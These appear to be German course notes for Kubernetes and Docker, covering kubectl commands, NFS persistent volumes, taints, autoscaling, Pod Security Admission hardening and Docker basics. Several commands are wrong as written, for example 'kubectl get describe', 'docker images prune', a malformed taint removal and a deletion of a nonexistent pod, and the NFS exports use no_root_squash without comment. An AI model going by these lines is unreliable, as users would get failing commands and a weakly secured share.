kubectl get pods 

## Aufbau des Befehls  
## kubectl run NAME --image=IMAGE_EG_FROM_DOCKER

## Ein Beispiel
kubectl run nginx --image=nginx:1.25.1

kubectl get pods 
## Alle nodes anzeigen
kubectl get nodes -o wide 
## Auf welchem Node läuft der Pods
kubectl get pods -o wide 
```

### Beispiel 2 (das nicht funktioniert !!)

```
kubectl run sonnenschein --image=foo2
## Ergebnis-> pod/sonnenschein created
## ABER: 
## ImageErrPull - Image konnte nicht geladen werden  => bedeutet pod läuft nicht, obwohl nicht 
kubectl get pods 
## Weitere status - info 
kubectl describe pods sonnenschein
```

### Beide Pods wieder löschen

```
kubectl delete pods nginx foo2 
kubectl get pods
```

### Referenz:

  * https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#run

### Bash completion for kubectl


### Walkthrough 

```
## Eventuell, wenn bash-completion nicht installiert ist.
apt install bash-completion
source /usr/share/bash-completion/bash_completion
## is it installed properly 
type _init_completion
```

```
## activate for all users 
kubectl completion bash | sudo tee /etc/bash_completion.d/kubectl > /dev/null

## verifizieren - neue login shell
su -

## zum Testen
kubectl g<TAB> 
kubectl get 
```
### Alternative für k als alias für kubectl 

```
source <(kubectl completion bash)
complete -F __start_kubectl k

```

### Reference 

  * https://kubernetes.io/docs/tasks/tools/included/optional-kubectl-configs-bash-linux/

### kubectl Spickzettel


### Allgemein 

```
## Zeige Information über das Cluster 
kubectl cluster-info 

## Welche api-resources gibt es ?
kubectl api-resources 

## Hilfe zu object und eigenschaften bekommen
kubectl explain pod 
kubectl explain pod.metadata
kubectl explain pod.metadata.name 

```

### Arbeiten mit manifesten 

```
kubectl apply -f nginx-replicaset.yml 
## Wie ist aktuell die hinterlegte config im system
kubectl get -o yaml -f nginx-replicaset.yml 

## Änderung in nginx-replicaset.yml z.B. replicas: 4 
## dry-run - was wird geändert 
kubectl diff -f nginx-replicaset.yml 

## anwenden 
kubectl apply -f nginx-replicaset.yml 

## Alle Objekte aus manifest löschen
kubectl delete -f nginx-replicaset.yml 


```

### Ausgabeformate 

```
## Ausgabe kann in verschiedenen Formaten erfolgen 
kubectl get pods -o wide # weitere informationen 
## im json format
kubectl get pods -o json 

## gilt natürluch auch für andere kommandos
kubectl get deploy -o json 
kubectl get deploy -o yaml 
```



### Zu den Pods 

```
## Start einen pod // BESSER: direkt manifest verwenden
## kubectl run podname image=imagename 
kubectl run nginx image=nginx 

## Pods anzeigen 
kubectl get pods 
kubectl get pod
## Format weitere Information 
kubectl get pod -o wide 
## Zeige labels der Pods
kubectl get pods --show-labels 

## Zeige pods mit einem bestimmten label 
kubectl get pods -l app=nginx 

## Status eines Pods anzeigen 
kubectl describe pod nginx 

## Pod löschen 
kubectl delete pod nginx 

## Kommando in pod ausführen 
kubectl exec -it nginx -- bash 

```

### Arbeiten mit namespaces 

```
## Welche namespaces auf dem System 
kubectl get ns 
kubectl get namespaces 
## Standardmäßig wird immer der default namespace verwendet 
## wenn man kommandos aufruft 
kubectl get deployments 

## Möchte ich z.B. deployment vom kube-system (installation) aufrufen, 
## kann ich den namespace angeben
kubectl get deployments --namespace=kube-system 
kubectl get deployments -n kube-system 

## wir wollen unseren default namespace ändern 
kubectl config set-context --current --namespace <dein-namespace>
```



### Referenz

  * https://kubernetes.io/de/docs/reference/kubectl/cheatsheet/

### Tipps&Tricks zu Deploymnent - Rollout


### Warum 

```
Rückgängig machen von deploys, Deploys neu unstossen.
(Das sind die wichtigsten Fähigkeiten

```

### Beispiele 

```
## Deployment nochmal durchführen 
## z.B. nach kubectl uncordon n12.training.local 
kubectl rollout restart deploy nginx-deployment 

## Rollout rückgängig machen 
kubectl rollout undo deploy nginx-deployment 

```

## Kubernetes - Shared Volumes 

### Shared Volumes with nfs


### Create new server and install nfs-server

```
## on Ubuntu 20.04LTS
apt install nfs-kernel-server 
systemctl status nfs-server 

vi /etc/exports 
## adjust ip's of kubernetes master and nodes 
## kmaster
/var/nfs/ 192.168.56.101(rw,sync,no_root_squash,no_subtree_check)
## knode1
/var/nfs/ 192.168.56.103(rw,sync,no_root_squash,no_subtree_check)
## knode 2
/var/nfs/ 192.168.56.105(rw,sync,no_root_squash,no_subtree_check)

exportfs -av 
```

### On all nodes (needed for production) 

```
## 
apt install nfs-common 

```

### On all nodes (only for testing)

```
#### Please do this on all servers (if you have access by ssh)
### find out, if connection to nfs works ! 

## for testing 
mkdir /mnt/nfs 
## 10.135.0.18 is our nfs-server 
mount -t nfs 10.135.0.18:/var/nfs /mnt/nfs 
ls -la /mnt/nfs
umount /mnt/nfs
```

### Persistent Storage-Step 1: Setup PersistentVolume in cluster

```
cd
cd manifests 
mkdir -p nfs 
cd nfs 
nano 01-pv.yml 
```

```
apiVersion: v1
kind: PersistentVolume
metadata:
  # any PV name
  name: pv-nfs-tln<nr>
  labels:
    volume: nfs-data-volume-tln<nr>
spec:
  capacity:
    # storage size
    storage: 1Gi
  accessModes:
    # ReadWriteMany(RW from multi nodes), ReadWriteOnce(RW from a node), ReadOnlyMany(R from multi nodes)
    - ReadWriteMany
  persistentVolumeReclaimPolicy:
    # retain even if pods terminate
    Retain
  nfs:
    # NFS server's definition
    path: /var/nfs/tln<nr>/nginx
    server: 10.135.0.18
    readOnly: false
  storageClassName: ""
```

```
kubectl apply -f 01-pv.yml 
kubectl get pv 
```

### Persistent Storage-Step 2: Create Persistent Volume Claim 

```
nano 02-pvc.yml
```

```
## vi 02-pvc.yml 
## now we want to claim space
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: pv-nfs-claim-tln<nr>
spec:
  storageClassName: ""
  volumeName: pv-nfs-tln<nr>
  accessModes:
  - ReadWriteMany
  resources:
     requests:
       storage: 1Gi
```


```
kubectl apply -f 02-pvc.yml
kubectl get pvc
```

### Persistent Storage-Step 3: Deployment 

```
## deployment including mount 
## vi 03-deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 4 # tells deployment to run 4 pods matching the template
  template:
    metadata:
      labels:
        app: nginx
    spec:
       
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
        
        volumeMounts:
          - name: nfsvol
            mountPath: "/usr/share/nginx/html"

      volumes:
      - name: nfsvol
        persistentVolumeClaim:
          claimName: pv-nfs-claim-tln<tln>


```

```
kubectl apply -f 03-deploy.yml 

```

### Persistent Storage Step 4: service 

```
## now testing it with a service 
## cat 04-service.yml 
apiVersion: v1
kind: Service
metadata:
  name: service-nginx
  labels:
    run: svc-my-nginx
spec:
  type: NodePort
  ports:
  - port: 80
    protocol: TCP
  selector:
    app: nginx
```        

```
kubectl apply -f 04-service.yml 
```

### Persistent Storage Step 5: write data and test

```
## connect to the container and add index.html - data 
kubectl exec -it deploy/nginx-deployment -- bash 
## in container
echo "hello dear friend" > /usr/share/nginx/html/index.html 
exit 

## now try to connect 
kubectl get svc 

## connect with ip and port
kubectl run -it --rm curly --image=curlimages/curl -- /bin/sh 
## curl http://<cluster-ip>
## exit

## now destroy deployment 
kubectl delete -f 03-deploy.yml 

## Try again - no connection 
kubectl run -it --rm curly --image=curlimages/curl -- /bin/sh 
## curl http://<cluster-ip>
## exit 
```

### Persistent Storage Step 6: retest after redeployment 

```
## now start deployment again 
kubectl apply -f 03-deploy.yml 

## and try connection again  
kubectl run -it --rm curly --image=curlimages/curl -- /bin/sh 
## curl http://<cluster-ip>
## exit 
```




## Kubernetes - Wartung / Debugging 

### kubectl drain/uncordon


```
## Achtung, bitte keine pods verwenden, dies können "ge"-drained (ausgetrocknet) werden 
kubectl drain <node-name>
z.B. 
## Daemonsets ignorieren, da diese nicht gelöscht werden 
kubectl drain n17 --ignore-daemonsets 

## Alle pods von replicasets werden jetzt auf andere nodes verschoben 
## Ich kann jetzt wartungsarbeiten durchführen 

## Wenn fertig bin:
kubectl uncordon n17 

## Achtung: deployments werden nicht neu ausgerollt, dass muss ich anstossen.
## z.B. 
kubectl rollout restart deploy/webserver 


```

### Alte manifeste konvertieren mit convert plugin


### What is about? 

  * Plugins needs to be installed seperately on Client (or where you have your manifests) 

### Walkthrough 

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl-convert"
## Validate the checksum
curl -LO "https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl-convert.sha256"
echo "$(<kubectl-convert.sha256) kubectl-convert" | sha256sum --check
## install 
sudo install -o root -g root -m 0755 kubectl-convert /usr/local/bin/kubectl-convert

## Does it work 
kubectl convert --help 

## Works like so 
## Convert to the newest version 
## kubectl convert -f pod.yaml

```

### Reference 

  * https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-convert-plugin 

### Netzwerkverbindung zu pod testen


### Situation 

```
Managed Cluster und ich kann nicht auf einzelne Nodes per ssh zugreifen
```

### Behelf: Eigenen Pod starten mit busybox 

```
kubectl run podtest --rm -ti --image busybox -- /bin/sh
```

### Example test connection 

```
## wget befehl zum Kopieren
wget -O - http://10.244.0.99
```

```
## -O -> Output (grosses O (buchstabe)) 
kubectl run podtest --rm -ti --image busybox -- /bin/sh
/ # wget -O - http://10.244.0.99
/ # exit 
```

### Curl from pod api-server


https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c

## Kubernetes - Tipps & Tricks 

### Kubernetes Debuggen ClusterIP/PodIP


### Situation 

  * Kein Zugriff auf die Nodes, zum Testen von Verbindungen zu Pods und Services über die PodIP/ClusterIP 

### Lösung 

```
## Wir starten eine Busybox und fragen per wget und port ab
## busytester ist der name 
## long version 
kubectl run -it --rm --image=busybox busytester 
## wget <pod-ip-des-ziels> 
## exit 


## quick and dirty 
kubectl run -it --rm --image=busybox busytester -- wget <pod-ip-des-ziels>  

```

### Debugging pods


### How ?

  1. Which pod is in charge 
  1. Problems when starting: kubectl describe po mypod 
  1. Problems while running: kubectl logs mypod 

### Taints und Tolerations


### Taints 

```
Taints schliessen auf einer Node alle Pods aus, die nicht bestimmte taints haben:

Möglichkeiten:

o Sie werden nicht gescheduled - NoSchedule 
o Sie werden nicht executed - NoExecute 
o Sie werden möglichst nicht gescheduled. - PreferNoSchedule 

```

### Tolerations 

```
Tolerations werden auf Pod-Ebene vergeben: 
tolerations: 

Ein Pod kann (wenn es auf einem Node taints gibt), nur 
gescheduled bzw. ausgeführt werden, wenn er die 
Labels hat, die auch als
Taints auf dem Node vergeben sind.
```

### Walkthrough  

#### Step 1: Cordon the other nodes - scheduling will not be possible there 

```
## Cordon nodes n11 and n111 
## You will see a taint here 
kubectl cordon n11
kubectl cordon n111
kubectl describe n111 | grep -i taint 
```



### Step 2: Set taint on first node 

```
kubectl taint nodes n1 gpu=true:NoSchedule
```

### Step 3

```
cd 
mkdir -p manifests
cd manifests 
mkdir tainttest 
cd tainttest 
nano 01-no-tolerations.yml
```

```
##vi 01-no-tolerations.yml 
apiVersion: v1
kind: Pod
metadata:
  name: nginx-test-no-tol
  labels:
    env: test-env
spec:
  containers:
  - name: nginx
    image: nginx:1.21
```

```
kubectl apply -f . 
kubectl get po nginx-test-no-tol
kubectl get describe nginx-test-no-tol
```

### Step 4:

```
## vi 02-nginx-test-wrong-tol.yml 
apiVersion: v1
kind: Pod
metadata:
  name: nginx-test-wrong-tol
  labels:
    env: test-env
spec:
  containers:
  - name: nginx
    image: nginx:latest
  tolerations:
  - key: "cpu"
    operator: "Equal"
    value: "true"
    effect: "NoSchedule"
```

```
kubectl apply -f .
kubectl get po nginx-test-wrong-tol
kubectl describe po nginx-test-wrong-tol
```

### Step 5:

```
## vi 03-good-tolerations.yml 
apiVersion: v1
kind: Pod
metadata:
  name: nginx-test-good-tol
  labels:
    env: test-env
spec:
  containers:
  - name: nginx
    image: nginx:latest
  tolerations:
  - key: "gpu"
    operator: "Equal"
    value: "true"
    effect: "NoSchedule"
```

```
kubectl apply -f .
kubectl get po nginx-test-good-tol
kubectl describe po nginx-test-good-tol
```

#### Taints rausnehmen 

```
kubectl taint nodes n1 gpu:true:NoSchedule-
```

#### uncordon other nodes 

```
kubectl uncordon n11
kubectl uncordon n111
```

### References 
  
  * [Doku Kubernetes Taints and Tolerations](https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/)
  * https://blog.kubecost.com/blog/kubernetes-taints/

### Autoscaling Pods/Deployments


### Example: newest version with autoscaling/v2 used to be hpa/v1

```
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hello
spec:
  replicas: 3
  selector:
    matchLabels:
      app: hello
  template:
    metadata:
      labels:
        app: hello
    spec:
      containers:
      - name: hello
        image: k8s.gcr.io/hpa-example
        resources:
          requests:
            cpu: 100m
---
kind: Service
apiVersion: v1
metadata:
  name: hello
spec:
  selector:
    app: hello
  ports:
    - port: 80
      targetPort: 80
---
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: hello
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: hello
  minReplicas: 2
  maxReplicas: 20
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 80
```

  * https://docs.digitalocean.com/tutorials/cluster-autoscaling-ca-hpa/

### Reference 

  * https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/#autoscaling-on-more-specific-metrics
  * https://medium.com/expedia-group-tech/autoscaling-in-kubernetes-why-doesnt-the-horizontal-pod-autoscaler-work-for-me-5f0094694054

## Kubernetes Advanced 

### Curl api-server kubernetes aus pod heraus


https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c

## Kubernetes - Documentation 

### Documentation zu microk8s plugins/addons

  * https://microk8s.io/docs/addons

### Shared Volumes - Welche gibt es ?

  * https://kubernetes.io/docs/concepts/storage/volumes/

## Kubernetes - Hardening 

### Kubernetes Tipps Hardening


### PSA (Pod Security Admission) 

```
Policies defined by namespace.
e.g. not allowed to run container as root.

Will complain/deny when creating such a pod with that container type

```

### Möglichkeiten in Pods und Containern 

```
## für die Pods
kubectl explain pod.spec.securityContext 
kubectl explain pod.spec.containers.securityContext
```

### Example (seccomp / security context) 

```
A. seccomp - profile
https://github.com/docker/docker/blob/master/profiles/seccomp/default.json

```

```
apiVersion: v1
kind: Pod
metadata:
  name: audit-pod
  labels:
    app: audit-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json

  containers:

  - name: test-container
    image: hashicorp/http-echo:0.2.3
    args:
    - "-text=just made some syscalls!"
    securityContext:
      allowPrivilegeEscalation: false

```

### SecurityContext (auf Pod Ebene) 

```
kubectl explain pod.spec.containers.securityContext 

```


### NetworkPolicy 

```
## Firewall Kubernetes 
```

### Kubernetes Security Admission Controller Example


### Hintergrund: Warum PSA?

Die `securitycontext-exercise` zeigt, *wie* man Pods korrekt konfiguriert.
Das Problem: SecurityContext ist ein **"Trust the Developer"**-Ansatz. Jeder muss
es jedes Mal richtig machen — und in einem Team mit vielen Entwicklern, unter
Zeitdruck oder bei neuen Mitarbeitern passiert es unvermeidlich, dass jemand
`runAsNonRoot` vergisst, Capabilities nicht droppt oder `allowPrivilegeEscalation`
nicht setzt. Das Ergebnis ist ein root-Container in Produktion, ohne dass jemand
es bemerkt.

PSA ist die **technische Durchsetzung** dieser Anforderungen auf Cluster-Ebene:

- **Kein Vertrauen in die Konfiguration des Einzelnen** — der Cluster lehnt
  nicht-konforme Pods ab, bevor sie starten
- **Sofortiges Feedback** — der Entwickler sieht beim `kubectl apply` exakt,
  was fehlt, nicht erst im Monitoring
- **Defense in Depth** — auch wenn ein Angreifer einen Pod einschleusen kann,
  verhindert PSA, dass er privilegiert laeuft

PSA ist seit Kubernetes 1.25 fest eingebaut — kein zusaetzlicher Controller,
kein Helm Chart, nur Namespace-Labels.

| CIS | Anforderung | PSA-Profil |
|-----|-------------|------------|
| **5.2.1** | Mindestens ein aktiver Policy-Enforcement-Mechanismus | PSA aktivieren |
| 5.2.2 | Keine privilegierten Container | `baseline` / `restricted` |
| 5.2.6 | Kein `allowPrivilegeEscalation` | `restricted` |
| 5.2.7 | Keine Root-Container | `restricted` |

#### Die drei Modi

| Modus | Label | Wirkung |
|-------|-------|---------|
| `enforce` | `pod-security.kubernetes.io/enforce` | Pod wird **abgelehnt** |
| `warn`    | `pod-security.kubernetes.io/warn`    | Pod laeuft, aber **Warnung** im Terminal |
| `audit`   | `pod-security.kubernetes.io/audit`   | Pod laeuft, Verstoss landet im **Audit-Log** |

#### Die drei Profile

| Profil | Beschreibung |
|--------|-------------|
| `privileged` | Keine Einschraenkungen |
| `baseline` | Verhindert bekannte Privilege-Escalation-Vektoren |
| `restricted` | Streng: non-root, no caps, seccomp, kein hostPath |

> **Wichtig:** PSA greift nur auf neue Pods — bereits laufende Container werden nicht nachtraeglich beendet.

---

### Schritt 1: Namespace mit PSA-Labels anlegen

```
cd
mkdir -p manifests/psa
cd manifests/psa
```

```
nano 01-ns.yml
```

```
apiVersion: v1
kind: Namespace
metadata:
  name: psa-restricted
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
```

```
kubectl apply -f 01-ns.yml
kubectl get namespace psa-restricted --show-labels
```

**Erwartete Ausgabe (Labels sichtbar):**
```
NAME          STATUS   AGE   LABELS
psa-restricted   Active   5s    pod-security.kubernetes.io/enforce=restricted,...
```

---

### Schritt 2: Root-Container wird abgelehnt

```
nano 02-nginx-root.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-root
  namespace: psa-restricted
spec:
  containers:
  - name: nginx
    image: nginx:1.27
```

```
kubectl apply -f 02-nginx-root.yml
```

**Erwartete Ablehnung:**
```
Error from server (Forbidden): pods "nginx-root" is forbidden:
violates PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false (container "nginx" must set
  securityContext.allowPrivilegeEscalation=false),
  unrestricted capabilities (container "nginx" must set
  securityContext.capabilities.drop=["ALL"]),
  runAsNonRoot != true (pod or container "nginx" must set
  securityContext.runAsNonRoot=true),
  seccompProfile (pod or container "nginx" must set
  securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

PSA blockiert den Pod direkt beim `kubectl apply` — der Container wird nie gestartet.

---

### Schritt 3: Compliant Pod laeuft durch

```
nano 03-nginx-ok.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-ok
  namespace: psa-restricted
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: nginx
    image: nginxinc/nginx-unprivileged:1.27
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
```

```
kubectl apply -f 03-nginx-ok.yml
kubectl get pod nginx-ok -n psa-restricted
```

**Erwartete Ausgabe:**
```
NAME       READY   STATUS    RESTARTS   AGE
nginx-ok   1/1     Running   0          5s
```

---

### Schritt 4: warn-Modus verstehen

Im `warn`-Modus (`enforce: baseline`) laeuft der Pod durch — der Entwickler sieht
aber sofort die Warnung im Terminal. Gut fuer eine Einfuehrungsphase vor echtem Enforcement.

```
nano 04-ns-warn.yml
```

```
apiVersion: v1
kind: Namespace
metadata:
  name: psa-warn
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
```

```
kubectl apply -f 04-ns-warn.yml
```

```
nano 05-nginx-warn.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-warn
  namespace: psa-warn
spec:
  containers:
  - name: nginx
    image: nginx:1.27
```

```
kubectl apply -f 05-nginx-warn.yml
```

**Erwartete Ausgabe — Pod laeuft, aber Warnung:**
```
Warning: would violate PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false, ...
pod/nginx-warn created
```

---

### Grenzen von PSA — und wann Kyverno oder OPA Gatekeeper

PSA ist in Kubernetes eingebaut und braucht keine zusaetzlichen Komponenten.
Fuer alles darueber hinaus braucht man ein externes Admission-Control-Framework.

| Was PSA nicht kann | Loesung |
|-------------------|---------|
| Nur Images aus erlaubten Registries zulassen | Kyverno / OPA |
| Fehlende SecurityContext automatisch ergaenzen (Mutation) | Kyverno |
| Cluster-weite Policies ohne Namespace-Labels | Kyverno / OPA |
| Custom-Rules (z.B. Labelpflicht fuer alle Deployments) | Kyverno / OPA |
| Nicht-Pod-Ressourcen validieren (Ingress, ConfigMap) | Kyverno / OPA |
| Verschiedene Regeln pro Team / Projekt | Kyverno / OPA |

#### Kyverno vs. OPA Gatekeeper

**Kyverno** — empfohlen fuer die meisten Teams:
- Policies sind normales Kubernetes-YAML — keine neue Sprache
- Unterstuetzt Validation, Mutation und Generation
- Einfach installiert (Helm), grosse Community-Bibliothek mit fertigen Policies
- Gut geeignet fuer: Image-Registry-Restriction, Auto-Labels, Seccomp-Enforcement

**OPA Gatekeeper** — fuer komplexe Anforderungen:
- Policies in Rego (eigene Sprache) — maechtiger, aber steile Lernkurve
- Sinnvoll wenn: OPA bereits fuer andere Systeme im Einsatz ist (z.B. Terraform, Envoy)
- Besser fuer sehr individuelle Unternehmensregelwerke

**Empfehlung:** PSA zuerst aktivieren (kein Overhead, sofort wirksam), dann Kyverno
fuer alles was PSA nicht kann. OPA Gatekeeper nur wenn Rego bereits bekannt ist
oder OPA bereits im Stack vorhanden ist.

---

### Aufraeumen

```
kubectl delete namespace psa-restricted psa-warn
```

---

### Zusammenfassung

| Szenario | Ergebnis |
|----------|----------|
| Root-Container in `enforce: restricted` Namespace | Abgelehnt |
| Root-Container in `warn: restricted` / `enforce: baseline` Namespace | Warnung, laeuft |
| Compliant Pod in `enforce: restricted` Namespace | Laeuft |
| Namespace ohne PSA-Labels | Keine Einschraenkung |

### Referenzen

  * https://kubernetes.io/docs/concepts/security/pod-security-admission/
  * https://kubernetes.io/docs/concepts/security/pod-security-standards/
  * https://kyverno.io/
  * https://open-policy-agent.github.io/gatekeeper/
  * CIS Kubernetes Benchmark V1.12.0, Sektion 5.2

## Kubernetes Interna / Misc.

### OCI,Container,Images Standards


### Schritt 1:

```
cd
mkdir bautest
cd bautest 
```

### Schritt 2:

```
## nano docker-compose.yml
version: "3.8"

services:
  myubuntu:
    build: ./myubuntu
    restart: always
```

### Schritt 3:

```
mkdir myubuntu 
cd myubuntu 
```

```
nano hello.sh
```

```
##!/bin/bash
let i=0

while true
do
  let i=i+1
  echo $i:hello-docker
  sleep 5
done

```

```
## nano Dockerfile 
FROM ubuntu:latest
RUN apt-get update; apt-get install -y inetutils-ping
COPY hello.sh .
RUN chmod u+x hello.sh
CMD ["/hello.sh"]

```

### Schritt 4: 


```
cd ../
## wichtig, im docker-compose - Ordner seiend 
##pwd 
##~/bautest
docker-compose up -d 
## wird image gebaut und container gestartet 

## Bei Veränderung vom Dockerfile, muss man den Parameter --build mitangeben 
docker-compose up -d --build 
```

### Geolocation Kubernetes Cluster

  * https://learnk8s.io/bite-sized/connecting-multiple-kubernetes-clusters

## Docker-Befehle 

### Die wichtigsten Befehle


```
## docker hub durchsuchen
docker search hello-world

docker run <image>
## z.b. // Zieht das image aus docker hub 
## hub.docker.com 
docker run hello-world

## images die lokal vorhanden 
docker images 

## container (laufende) 
docker container ls 
## container (vorhanden, aber beendet)
docker container ls -a 

## z.b hilfe für docker run 
docker help run 

 


```

### Logs anschauen - docker logs - mit Beispiel nginx


### Allgemein 
```
## Erstmal nginx starten und container-id wird ausgegeben 
docker run -d nginx 
a234
docker logs a234 # a234 sind die ersten 4 Ziffern der Container ID 
```

### Laufende Log-Ausgabe 

```
docker logs -f a234 
## Abbrechen CTRL + c 
```

### docker run


### Beispiel (binden an ein terminal), detached

```
## before that we did
docker pull ubuntu:xenial
## image vorhanden 
docker images

docker run -t -d --name my_xenial ubuntu:xenial
## will wollen überprüfen, ob der container läuft
docker container ls 


## in den Container reinwechsel 
docker exec -it my_xenial bash 
docker exec my_xenial cat /etc/os-release
## 

```

### Docker container/image stoppen/löschen


```
docker stop ubuntu-container 
## Kill it if it cannot be stopped -be careful
docker kill ubuntu-container

## Get nur, wenn der Container nicht mehr läuft 
docker rm ubuntu-container

## oder alternative
docker rm -f ubuntu-container 


## image löschen 
docker rmi ubuntu:xenial 

## falls Container noch vorhanden aber nicht laufend 
docker rmi -f ubuntu:xenial 

```

### Docker containerliste anzeigen


```
## besser 
docker container ls 
## Alle Container, auch die, die beendet worden sind 
docker container ls -a 


## deprecated 
docker ps 
## -a auch solche die nicht mehr laufen 
docker ps -a



```

### Docker nicht verwendete Images/Container löschen


```
docker system prune 
## Löscht möglicherweise nicht alles

## d.h. danach nochmal prüfen ob noch images da sind
docker images 
## und händisch löschen 
docker rmi <image-name>

```

### Docker container analysieren


```
docker run -t -d --name mein_container ubuntu:latest
docker inspect mein_container # mein_container = container name 
```

### Docker container in den Vordergrund bringen - attach


### docker attach - walkthrough 

```
docker run -d ubuntu 
1a4d...

docker attach 1a4d 

## Es ist leider mit dem Aufruf run nicht möglich, den prozess wieder in den Hintergrund zu bringen 

```

### interactiven Prozess nicht beenden (statt exit) 

```
docker run -it ubuntu bash  
## ein exit würde jetzt den Prozess beenden
## exit

## Alternativ ohne beenden (detach) 
## Geht aber nur beim start mit run -it 
CTRL + P, dann CTRL + Q 

```

### Reference: 

  * https://docs.docker.com/engine/reference/commandline/attach/

### Aufräumen - container und images löschen


### Alle nicht verwendeten container und images löschen 

```
## Alle container, die nicht laufen löschen 
docker container prune 

## Alle images, die nicht an eine container gebunden sind, löschen 
docker images prune 

```

### Nginx mit portfreigabe laufen lassen


```
docker run --name test-nginx -d -p 8080:80 nginx

docker container ls
lsof -i
cat /etc/services | grep 8080
curl http://localhost:8080
docker container ls
## wenn der container gestoppt wird, keine ausgabe mehr, weil kein webserver
docker stop test-nginx 
curl http://localhost:8080


```

## Dockerfile - Examples 

### Ubuntu mit hello world


### Simple Version 

#### Schritt 1:
```
cd 
mkdir hello-world 
cd hello-world
```

#### Schritt 2:

```
## nano Dockerfile
FROM ubuntu:22.04 

COPY hello.sh .
RUN chmod u+x hello.sh
CMD ["/hello.sh"]
```

#### Schritt 3:
```
nano hello.sh 
```

```
##!/bin/bash
let i=0

while true
do
  let i=i+1
  echo $i:hello-docker
  sleep 5
done
```

#### Schritt 4:

```
## dockertrainereu/<dein-name>-hello-docker . 
## Beispiel
docker build -t dockertrainereu/jm-hello-docker .
docker images
docker run dockertrainereu/<dein-name>-hello-docker 
```


#### Schritt 5:

```
docker login
user: dockertrainereu 
pass: --bekommt ihr vom trainer--

## docker push dockertrainereu/<dein-name>-hello-docker 
## z.B. 
docker push dockertrainereu/jm-hello-docker

## und wir schauen online, ob wir das dort finden

```



### Ubuntu mit ping


```
mkdir myubuntu 
cd myubuntu/
```

```
## nano Dockerfile
FROM ubuntu:22.04
RUN apt-get update; apt-get install -y inetutils-ping
## CMD ["/bin/bash"]
```

```
## Variante 2
## nano Dockerfile
FROM ubuntu:22.04
RUN apt-get update && \
    apt-get install -y inetutils-ping && \
    rm -rf /var/lib/apt/lists/*
## CMD ["/bin/bash"]
```

```
docker build -t myubuntu .
docker images
## -t wird benötigt, damit bash WEITER im Hintergrund im läuft.
## auch mit -d (ohne -t) wird die bash ausgeführt, aber "das Terminal" dann direkt beendet 
## -> container läuft dann nicht mehr 
```

```
docker run -d -t --name container-ubuntu myubuntu
docker container ls
## in den container reingehen mit dem namen des Containers: myubuntu 
docker exec -it myubuntu bash
ls -la
 ```

```
## Zweiten Container starten
docker run -d -t --name container-ubuntu2 myubuntu 

## docker inspect to find out ip of other container 
## 172.17.0.3 
docker inspect <container-id>

## Ersten Container -> 2. anpingen 
docker exec -it container-ubuntu bash 
## Jeder container hat eine eigene IP 
ping 172.17.0.3

 
```

### Nginx mit content aus html-ordner


### Schritt 1: Simple Example 

```
## das gleich wie cd ~
## Heimatverzeichnis des Benutzers root 
cd
mkdir nginx-test
cd nginx-test
mkdir html
cd html/
vi index.html

```

```
Text, den du rein haben möchtest 
```

```
cd ..
vi Dockerfile 
```

```
FROM nginx:latest
COPY html /usr/share/nginx/html
```

```
## nameskürzel z.B. jm1 
docker build -t nginx-test  . 
docker images

```



### Schritt 2: docker laufen lassen

```
## und direkt aus der Registry wieder runterladen 
docker run --name hello-web -p 8080:80 -d nginx-test

## laufenden Container anzeigen lassen
docker container ls 
## oder alt: deprecated 
docker ps 

curl http://localhost:8080 


## 
docker rm -f hello-web 

```

## Docker-Netzwerk 

### Netzwerk


### Übersicht

```
3 Typen 

o none
o bridge (Standard-Netzwerk) 
o host 

### Additionally possible to install
o overlay (needed for multi-node)

```


### Kommandos 

```
## Netzwerk anzeigen 
docker network ls 

## bridge netzwerk anschauen 
## Zeigt auch ip der docker container an  
docker inspect bridge

## im container sehen wir es auch
docker inspect ubuntu-container 

```

### Eigenes Netz erstellen 

```
docker network create -d bridge test_net 
docker network ls 

docker container run -d --name nginx --network test_net nginx
docker container run -d --name nginx_no_net --network none nginx 

docker network inspect none 
docker network inspect test_net 

docker inspect nginx 
docker inspect nginx_no_net 

```

### Netzwerk rausnehmen / hinzufügen 

```
docker network disconnect none nginx_no_net
docker network connect test_net nginx_no_net 

### Das Löschen von Netzwerken ist erst möglich, wenn es keine Endpoints 
### d.h. container die das Netzwerk verwenden 
docker network rm test_net 
```



## Docker-Container Examples 

### 2 Container mit Netzwerk anpingen


```
clear
docker run --name dockerserver1 -dit ubuntu
docker run --name dockerserver2 -dit ubuntu
docker network ls
docker network inspect bridge
## dockerserver1 - 172.17.0.2
## dockerserver2 - 172.17.0.3
docker container ls
docker exec -it dockerserver1 bash
## im container 
apt update; apt install -y iputils-ping 
